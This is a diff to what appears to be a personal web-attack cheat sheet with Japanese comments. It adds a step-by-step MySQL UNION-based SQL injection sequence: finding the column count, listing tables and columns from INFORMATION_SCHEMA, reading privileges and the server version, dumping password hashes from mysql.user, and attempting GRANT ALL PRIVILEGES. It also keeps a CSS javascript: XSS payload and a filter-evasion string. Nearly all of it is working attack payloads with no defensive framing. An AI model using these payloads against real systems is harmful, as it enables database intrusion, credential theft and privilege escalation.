@@ -65,9 +65,21 @@ background-color:#f00;background:url("javascript:alert(document.domain);");
 ' or 1=1 union select password, name, 1 from users_hogefuga;--
 SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
 
-hoge
-fuga' OORR '1
+# null の数を変えてカラム数を特定
+' and 1=0 UNION ALL SELECT null,null,null#
+# テーブル一覧を取得
+' and 1=0 UNION ALL (SELECT TABLE_SCHEMA,TABLE_NAME ,TABLE_COMMENT FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE') ;#
+# カラム一覧を取得
+' and 1=0 UNION ALL (SELECT TABLE_NAME,COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME IN('func') ORDER BY TABLE_NAME) ;#
+' and 1=0 UNION ALL (SELECT 1, 1, GRANTEE FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES); #
 
+' and 1=0 UNION ALL SELECT null,null,null FROM user;#
+' and 1=0 UNION ALL SELECT null, current_user(), version();#
+' and 1=0 UNION ALL GRANT ALL PRIVILEGES ON *.* TO username@'%'#
+' and 1=0 UNION ALL SELECT null, null, password FROM mysql.user#
+SCHEMA_PRIVILEGES
+fuga' OORR '1
+5.1.73
 https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
 
 # Wire shark packete filter
